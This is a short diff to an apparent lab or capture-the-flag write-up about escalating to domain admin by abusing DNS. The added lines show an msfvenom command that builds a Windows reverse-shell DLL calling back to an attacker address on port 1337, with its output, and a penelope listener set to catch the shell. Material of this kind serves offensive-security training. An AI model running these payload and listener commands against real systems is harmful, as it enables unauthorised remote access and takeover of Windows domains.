@@ -713,7 +713,27 @@ Info: Establishing connection to remote endpoint
 
 Now i have access i can abuse DNS to get DA
 
-```pytho
+```python
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.200.76.227 LPORT=1337 -f dll -o reverse.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: reverse.dll
+```
+
+First ill generate a payload!
+
+```python
+penelope -p 1337         
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.76.227
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+Then set a listener
+
+```python
+
 ```
 
 
